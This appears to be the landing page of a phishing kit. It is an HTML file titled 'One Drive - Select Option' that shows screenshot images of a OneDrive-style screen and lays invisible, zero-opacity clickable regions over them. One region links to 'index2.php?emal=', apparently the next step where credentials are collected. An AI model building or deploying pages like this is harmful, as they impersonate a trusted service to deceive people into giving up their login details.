<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>One Drive - Select Option</title>
<link rel="shortcut icon" href="images/fav.ico">
<style type="text/css">
div#container
{
   width: 800px;
   height: 600px;
   margin-top: 0px;
   margin-left: 0px;
   text-align: left;
}
</style>
<style type="text/css">
body
{
   background-color: #0066FF;
   background-image: url(images/_bkgrnd.png);
   color: #000000;
}
</style>
<style type="text/css">
a:hover
{
   color: #94A9CB;
}
</style>
<script type="text/javascript">
<!--
function popupwnd(url, toolbar, menubar, locationbar, resize, scrollbars, statusbar, left, top, width, height)
{
   if (left == -1)
   {
      left = (screen.width/2)-(width/2);
   }
   if (top == -1)
   {
      top = (screen.height/2)-(height/2);
   }
   var popupwindow = this.open(url, '', 'toolbar=' + toolbar + ',menubar=' + menubar + ',location=' + locationbar + ',scrollbars=' + scrollbars + ',resizable=' + resize + ',status=' + statusbar + ',left=' + left + ',top=' + top + ',width=' + width + ',height=' + height);
}
//-->
</script>
<!--[if lt IE 7]>
<style type="text/css">
   img { behavior: url("pngfix.htc"); }
</style>
<![endif]-->
</head>
<body>
<div id="container">
<div id="bv_Image1" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:501px;height:550px;text-align:left;z-index:0;">
<img src="images/bode1.png" id="Image1" alt="" align="top" border="0" style="width:501px;height:550px;"></div>
<div id="bv_Image2" style="margin:0;padding:0;position:absolute;left:501px;top:0px;width:847px;height:550px;text-align:left;z-index:1;">
<img src="images/bode2.png" id="Image2" alt="" align="top" border="0" style="width:847px;height:550px;"></div>


<div id="bv_Image5" style="margin:0;padding:0;position:absolute;left:0px;top:0px;width:1319px;height:551px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:2;">


<img src="" id="Image5" alt="" align="top" border="0" style="width:1319px;height:551px;"></div>

<div id="bv_Image3" style="margin:0;padding:0;position:absolute;left:73px;top:360px;width:302px;height:45px;opacity:0.00;-moz-opacity:0.00;-khtml-opacity:0.00;filter:alpha(opacity=0);text-align:left;z-index:2;">

<a href="index2.php?emal=" target="_self"><img src="" id="Image3" alt="" align="top" border="0" style="width:302px;height:40px;"></a></div>



</div>
</body>
</html>